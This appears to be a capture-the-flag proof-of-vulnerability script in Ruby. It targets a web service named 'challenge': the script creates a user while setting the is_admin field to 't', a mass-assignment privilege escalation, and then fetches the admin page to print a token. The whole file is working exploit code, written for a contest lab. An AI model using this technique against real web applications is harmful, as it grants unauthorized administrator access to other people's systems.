#!/bin/env ruby

require "logger"

require 'securerandom'

require "httparty"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)


class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['HTTP_PORT'] || '3080'

    @base_uri = URI "http://#{@host}:#{@port}/"
  end

  def run!
    new_user_uri = @base_uri.dup
    new_user_uri.path = '/user'

    username = SecureRandom.uuid

    new_user_result = HTTParty.post(new_user_uri, 
                                body: {
                                  name: username,
                                  password: username,
                                  is_admin: 't'
                                })

    if 201 != new_user_result.code
      LLL.fatal new_user_result.request.raw_body
      LLL.fatal new_user_result.inspect
      fail "unexpected status from POST to #{new_user_uri}"
    end
    

    admin_uri = @base_uri.dup
    admin_uri.path = '/admin'
    admin_uri.user = username
    admin_uri.password = username

    admin_get_result = HTTParty.get(admin_uri)

    if 200 == admin_get_result.code
      puts "TOKEN=#{admin_get_result.body.to_s}"
      return
    end

    LLL.fatal "Didn't get a success response from #{@admin_uri}:"
    puts admin_get_result.inspect
    fail "no dice, boss"
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
